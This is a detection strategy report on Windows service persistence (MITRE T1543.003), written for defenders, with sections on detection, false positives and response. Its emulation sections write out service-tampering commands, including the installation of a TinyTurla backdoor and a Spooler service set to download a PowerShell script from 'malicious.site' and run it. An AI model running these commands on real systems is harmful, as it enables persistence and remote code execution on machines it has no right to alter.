# Alerting & Detection Strategy (ADS) Report: MITRE ATT&CK T1543.003 - Windows Service

## Goal
This strategy aims to detect adversarial attempts to utilize Windows services as a mechanism for persistence and privilege escalation, specifically focusing on T1543.003 from the MITRE ATT&CK framework. It seeks to identify unauthorized modifications or creations of services that could be leveraged by adversaries to maintain access or escalate privileges within a network.

## Categorization
- **MITRE ATT&CK Mapping:** T1543.003 - Windows Service
- **Tactic / Kill Chain Phases:** Persistence, Privilege Escalation
- **Platforms:** Windows

[MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1543/003)

## Strategy Abstract
The detection strategy utilizes event logs, file integrity monitoring (FIM), and behavioral analysis to identify suspicious activities related to Windows services. Key data sources include:
- Windows Event Logs (e.g., Service Control Manager events)
- System File Integrity Monitors
- Network traffic for anomalies

Patterns analyzed include unexpected service creations or modifications, especially those involving system directories or execution of unusual binaries like PowerShell scripts.

## Technical Context
Adversaries commonly use the `sc.exe` command to create new services or modify existing ones. This can be executed with elevated privileges to maintain persistence by scheduling regular task executions or using backdoors like TinyTurla (`w64time`). In real-world scenarios, adversaries may install malicious executables in system directories and configure them as Windows services.

### Adversary Emulation Details
- **Sample Commands:**
  - Create a new service:
    ```shell
    sc.exe create MaliciousService binPath= "C:\Windows\System32\svchost.exe" DisplayName= "Malicious Service"
    ```
  - Modify an existing service to run PowerShell:
    ```shell
    sc.exe config Faxsvc binPath= "C:\windows\system32\powershell.exe"
    ```

## Blind Spots and Assumptions
- **Limitations:** The strategy might not detect obfuscated scripts or services configured with delayed start-up times.
- **Assumptions:** It assumes that changes to system directories are suspicious, which may not account for legitimate software installations.

## False Positives
Potential benign activities that could trigger false alerts include:
- Legitimate system updates or patches modifying service configurations.
- IT operations creating or modifying services as part of maintenance tasks.
- Software installers adding custom services during installation.

## Priority
**Severity: High**
Justification: Unauthorized service modifications can lead to persistent access and privilege escalation, significantly impacting security posture. The potential damage from a successful exploit is substantial, making prompt detection critical.

## Validation (Adversary Emulation)
To emulate this technique in a test environment:

1. **Modify Fax Service to Run PowerShell:**
   - Open Command Prompt as Administrator.
   - Execute:
     ```shell
     sc.exe config Faxsvc binPath= "C:\windows\system32\powershell.exe"
     ```

2. **Service Installation Using CMD:**
   - Create a new service with `sc.exe`:
     ```shell
     sc.exe create TestService binPath= "C:\Windows\System32\notepad.exe" DisplayName= "Test Service"
     ```

3. **Service Installation Using PowerShell:**
   - Use PowerShell to install a service:
     ```powershell
     New-Service -Name "PowerShellService" -BinaryPathName "C:\Windows\System32\calc.exe"
     ```

4. **TinyTurla Backdoor Service (`w64time`):**
   - Install the backdoor as a service (ensure legality and consent):
     ```shell
     sc.exe create w64time binPath= "C:\path\to\tinyturla.exe" start= auto
     ```

5. **Remote Service Installation Using CMD:**
   - From a remote machine, execute:
     ```shell
     sc \\target_machine create RemoteService binPath= "C:\Windows\System32\calc.exe"
     ```

6. **Modify Service to Run Arbitrary Binary (PowerShell):**
   - Alter an existing service:
     ```shell
     sc.exe config Spooler binPath= "C:\windows\system32\powershell.exe -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.site/script.ps1')"
     ```

## Response
When an alert is triggered, analysts should:

1. **Verify the Alert:** Confirm if a new service was created or modified.
2. **Investigate Intent:**
   - Examine the binary path and command line arguments for suspicious activity.
3. **Containment:**
   - Disable the suspect service immediately using:
     ```shell
     sc.exe stop MaliciousService
     sc.exe delete MaliciousService
     ```
4. **Root Cause Analysis:** Determine how the modification occurred, identifying potential security gaps or compromised accounts.

## Additional Resources
- **New Service Creation Using Sc.EXE**
- **Suspicious New Service Creation**
- **Potential Persistence Attempt Via Existing Service Tampering**
- **Suspicious Copy From or To System Directory**
- **New Service Creation Using PowerShell**
- **Suspicious Service Path Modification**

This report serves as a comprehensive guide for detecting and responding to unauthorized Windows service modifications, enhancing an organization's security posture against sophisticated threat actors.